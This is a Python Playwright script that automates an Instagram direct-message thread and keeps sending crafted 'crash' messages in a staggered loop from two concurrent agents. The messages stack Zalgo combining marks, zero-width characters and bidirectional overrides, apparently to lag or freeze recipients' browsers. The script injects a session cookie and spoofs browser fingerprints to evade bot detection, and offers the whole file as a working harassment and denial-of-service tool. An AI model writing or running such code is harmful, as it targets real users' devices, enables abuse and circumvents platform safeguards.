# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (OVERCLOCKED-V1)
# 📅 STATUS: FAST-PIPELINE | DUAL-AGENT | MEMORY-INJECTION

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload():
    """High-entropy Zalgo blocks for maximum desktop browser lag."""
    u_id = random.randint(100000, 999999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u2060"], k=20))
    header = f"⚠️ CRITICAL_ERR_{u_id}\n{salt}\n"
    
    # High-intensity Zalgo
    z_tower = "̸" * random.randint(60, 85)
    width_bomb = "\u2800\u00A0" * 30
    
    lines = [header]
    for i in range(75): 
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789ABCDEF", k=3))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
    return "\n".join(lines)[:9900]

async def run_agent(agent_id, context, target_id):
    page = await context.new_page()
    page.set_default_navigation_timeout(90000)
    
    try:
        print(f"📡 [A{agent_id}] Overclocking Connection...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
        
        box = page.get_by_role("textbox", name="Message")
        await box.wait_for(state="visible", timeout=60000)

        strike_count = 0
        while True:
            payload = get_kernel_stop_payload()
            
            # 🔥 SPEED FIX: Direct DOM injection instead of typing
            await box.fill(payload)
            await page.keyboard.press("Enter")
            
            strike_count += 1
            print(f"💀 [A{agent_id}] Strike {strike_count} Delivered.")
            
            # ⏳ FAST JITTER: Reduced from 120s to 45-75s
            # We stagger A1 and A2 to create a continuous wave of lag
            if agent_id == 1:
                await asyncio.sleep(random.uniform(45, 65))
            else:
                await asyncio.sleep(random.uniform(55, 75))

            # 🧊 COOLING CYCLE: Prevent server-side ghosting every 10 strikes
            if strike_count % 10 == 0:
                print(f"🧊 [A{agent_id}] Cooling systems for 2 minutes...")
                await asyncio.sleep(120)

    except Exception as e:
        print(f"❌ [A{agent_id}] Crash: {str(e)[:50]}")
        await page.close()

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

        # 🔥 ASYNC GATHER: Both agents firing in a staggered loop
        await asyncio.gather(
            run_agent(1, context, target_id),
            run_agent(2, context, target_id)
        )

if __name__ == "__main__":
    asyncio.run(main())
